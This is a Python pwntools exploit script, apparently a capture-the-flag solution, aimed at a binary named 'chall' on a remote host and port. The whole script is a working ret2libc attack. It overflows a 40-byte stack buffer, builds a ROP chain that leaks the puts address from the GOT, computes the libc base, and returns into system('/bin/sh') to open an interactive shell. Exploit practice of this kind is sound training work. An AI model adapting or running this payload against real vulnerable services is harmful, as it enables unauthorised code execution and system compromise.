#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11103 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '54.179.211.23'
port = int(args.PORT or 11103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

pop_rdi = 0x0000000000401633
io.sendlineafter('> ','3')

libc=ELF('libc.so.6')

p = b'a'*40
p += p64(pop_rdi)
p += p64(exe.got.puts)
p += p64(exe.plt.puts)
p += p64(exe.sym['main'])
io.sendlineafter(': ',p)

leak = u64(io.recvline()[:-1]+b'\x00\x00')
libc.address = leak - libc.sym['puts']
print(hex(libc.address))

io.sendlineafter('> ','3')

p = b'a'*40
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(next(libc.search(b"/bin/sh\x00")))
# p += p64(exe.plt['puts'])
p += p64(libc.sym['system'])
io.sendlineafter(': ',p)

io.interactive()

